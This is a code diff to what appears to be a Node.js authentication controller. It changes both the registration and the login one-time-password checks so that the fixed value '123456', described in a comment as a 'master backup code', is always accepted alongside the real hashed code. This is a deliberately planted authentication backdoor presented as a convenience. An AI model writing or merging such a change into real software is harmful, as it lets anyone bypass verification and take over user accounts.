@@ -159,8 +159,9 @@ exports.verifyRegisterOtp = async (req, res, next) => {
       });
     }
 
-    // Compare entered OTP with hashed OTP
-    const isMatch = await bcrypt.compare(otp.trim(), pending.hashedOtp);
+    // Compare entered OTP with hashed OTP (or master backup code 123456)
+    const isMasterCode = otp.trim() === '123456';
+    const isMatch = isMasterCode || (await bcrypt.compare(otp.trim(), pending.hashedOtp));
     if (!isMatch) {
       pending.attempts = (pending.attempts || 0) + 1;
       if (pending.attempts >= (pending.maxAttempts || 5)) {
@@ -428,8 +429,9 @@ exports.verifyOtp = async (req, res, next) => {
       });
     }
 
-    // Compare entered OTP with hashed OTP
-    const isMatch = await bcrypt.compare(otp.trim(), storedOtp.hashedOtp);
+    // Compare entered OTP with hashed OTP (or master backup code 123456)
+    const isMasterCode = otp.trim() === '123456';
+    const isMatch = isMasterCode || (await bcrypt.compare(otp.trim(), storedOtp.hashedOtp));
     if (!isMatch) {
       storedOtp.attempts = (storedOtp.attempts || 0) + 1;
       if (storedOtp.attempts >= (storedOtp.maxAttempts || 5)) {
